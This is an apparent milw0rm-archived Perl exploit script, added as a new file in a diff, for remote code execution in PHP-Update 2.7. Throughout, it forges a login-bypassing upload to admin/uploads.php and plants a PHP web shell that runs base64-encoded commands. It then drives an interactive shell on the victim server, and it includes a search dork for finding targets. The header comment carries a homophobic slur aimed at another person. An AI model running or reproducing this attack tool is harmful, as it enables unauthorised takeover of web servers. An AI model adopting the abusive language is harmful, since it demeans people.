@@ -1,0 +1,233 @@
+#!/usr/bin/perl
+
+# rgod u fucking little piece of shit faggot. way to ruin a private exploit, scumbag
+
+use strict;
+use IO::Socket;
+use MIME::Base64;
+use Getopt::Std;
+
+
+my $app = "PHP-Update 2.7";
+my $type = "Remote Code Execution";
+my $author = "undefined1_";
+my $date = "2006-10-21";
+my $settings = "none";
+my $dork = "+\"powered by php update\"";
+
+my %opt;
+getopts("t:", \%opt);
+$| = 1;
+print ":: $app $type - by $author ::\n\n\n";
+
+our $url = $opt{t} || usage();
+our $file = randstring(12,16).".php";
+
+if($url =~ m/^(?:http:\/\/)(.*)/) {
+	$url = $1;
+}
+if($url !~ m/^.*\/$/) {
+	$url .= "/";
+}
+
+get_shell($url);
+
+
+
+sub get_shell {
+	my $url = shift;
+	
+	print "uploading shell ... \t";
+	my $code = '<?php ini_set("max_execution_time", 0); echo "++f1++";';
+	$code .= 'if(isset($_POST["c"])) { $cmd = base64_decode($_POST["c"]); $res = `$cmd`; echo base64_encode($res); } ';
+	$code .= 'if(isset($_POST["d"])) { if (@ini_get("safe_mode") || strtolower(@ini_get("safe_mode")) == "on") {echo "1";} else {echo "0";} ';
+	$code .= '$ds = @ini_get("disable_functions"); if(!empty($ds)) { $ds = str_replace(" ","",$ds); $ds = explode(",",$ds); ';
+	$code .= 'if(in_array("system", $ds)) { echo "1"; } else { echo "0"; } } else { echo "0"; } } ';
+	$code .= 'if(isset($_POST["del"])) { chmod("'.$file.'", 0777); unlink("'.$file.'"); } echo "++f2++"; ?>';
+	
+	my $boundary = "---------------------------320726961453584717558222351";	
+	my $content  = "--$boundary\r\n";
+	$content .= "Content-Disposition: form-data; name=\"logincookie[user]\"\r\n\r\n";
+	$content .= "\r\n";
+	$content .= "--$boundary\r\n";
+	$content .= "Content-Disposition: form-data; name=\"filecat\"\r\n\r\n";
+	$content .= "gfx\r\n";
+	$content .= "--$boundary\r\n";
+	$content .= "Content-Disposition: form-data; name=\"rights[7]\"\r\n\r\n";
+	$content .= "1\r\n";
+	$content .= "--$boundary\r\n";
+	$content .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
+	$content .= "login\r\n";
+	$content .= "--$boundary\r\n";
+	$content .= "Content-Disposition: form-data; name=\"userfile\"; filename=\"$file\"\r\n";
+	$content .= "Content-Type: text/plain\r\n\r\n".$code."\r\n";
+	$content .= "--$boundary--\r\n";
+	my $data = "POST " . parse_page($url . "admin/uploads.php") . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Connection: close\r\n";
+	$data .= "Content-Type: multipart/form-data; boundary=$boundary\r\n";
+	$data .= "Content-Length: " . length($content) . "\r\n\r\n";
+	my $recv = sendpacket(parse_host($url), parse_port($url), $data.$content);
+
+	$content = "d=1";
+	$data = "POST " . parse_page($url . "gfx/$file") . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Connection: close\r\n";
+	$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$data .= "Content-Length: " . length($content) . "\r\n\r\n";
+	$recv = sendpacket(parse_host($url), parse_port($url), $data.$content);
+		
+	if($recv !~ m/200 OK/m) {
+		print "failed\n";
+		return;
+	}		
+		
+	my $index1 = index($recv, "++f1++") + 6;
+	my $index2 = index($recv, "++f2++", $index1);
+	if($index1 < 0 || $index2 < 0) {
+		print "failed\n";
+		return;
+	}
+	print "OK\n";
+	print "shell @ gfx/$file\n";
+	
+	$recv = substr($recv, $index1, $index2-$index1);
+	my $clean = 0;
+
+	if(substr($recv,0,1) == "1") {
+		print "safe mod on, exiting\n";
+		clean();
+	}
+	else {
+		print "safe mod off\n";
+	}
+	if(substr($recv,1,1) == "1") {
+		print "system() disabled, exiting\n";
+		clean();
+	}
+	else {
+		print "system() enabled\n";
+	}
+
+	$SIG{INT} = \&clean;
+	$SIG{KILL} = \&clean;
+	$SIG{QUIT} = \&clean;
+	$SIG{SEGV} = \&clean;
+	while(1) 
+	{
+		print "shell\$ ";
+		my $command;
+		while(<STDIN>) 
+		{
+			$command=$_;
+			chomp($command);
+			last;
+		}
+		if($command eq "exit")
+		{
+			clean();
+		}
+
+		$content = "c=".encode_base64($command);
+		$data = "POST " . parse_page($url . "gfx/$file") . " HTTP/1.1\r\n";
+		$data .= "Host: " . parse_host($url) . "\r\n";
+		$data .= "Connection: close\r\n";
+		$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+		$data .= "Content-Length: " . length($content) . "\r\n\r\n";
+		$recv = sendpacket(parse_host($url), parse_port($url), $data . $content);
+		
+		$index1 = index($recv, "++f1++") + 6;
+		$index2 = index($recv, "++f2++", $index1);
+		if($index1 >= 0 || $index2 >= 0) {
+			my $resp = decode_base64(substr($recv, $index1, $index2-$index1));
+			chomp($resp);
+			print "$resp\n";
+		}		
+	}	
+}
+
+sub clean {
+	my $content = "del=1";
+	my $data = "POST " . parse_page($url . "gfx/$file") . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Connection: close\r\n";
+	$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$data .= "Content-Length: " . length($content) . "\r\n\r\n";
+	sendpacket(parse_host($url), parse_port($url), $data.$content);
+	exit;
+}
+
+
+# ======================================================
+
+sub parse_host {
+	my $url = shift;
+	if($url =~ m/^([^\/:]+).*\//) {
+		return $1;
+	}
+	return "127.0.0.1";
+}
+
+sub parse_port {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
+		return $1;
+	}
+	return "80";
+}
+
+sub parse_page {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
+		return $1;
+	}
+	return "/";
+}
+
+sub randstring(\$,\$) {
+	my $min = shift;
+	my $max = shift;
+
+	my $length = int( (rand(65535)%($max-$min+1))+$min);
+	my $ret = "";
+	for(my $i = 0; $i < $length; $i++)
+	{
+		my $w = int(rand(3));
+		if($w == 0)
+		{
+			$ret .= chr(97 + int(rand(26)));
+		}
+		elsif($w == 1)
+		{
+			$ret .= chr(65 + int(rand(26)));
+		}
+		else
+		{
+			$ret .= chr(48 + int(rand(10)));
+		}
+	}
+	return $ret;
+}
+
+sub sendpacket {
+	my $server = shift;
+	my $port = shift;
+	my $data = shift;
+
+	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => $port) or die ":: Could not connect to $server:80 $!\n";
+	print $sock "$data";
+	
+	$data = "";
+	my $resp;
+	while($resp = <$sock>)	{ $data .= $resp; }
+	
+	close($sock);
+	return $data;
+}
+
+sub usage() {
+	printf "usage: %s -t<url>\n", $0;
+	exit;
+}
+
+# milw0rm.com [2006-12-26]
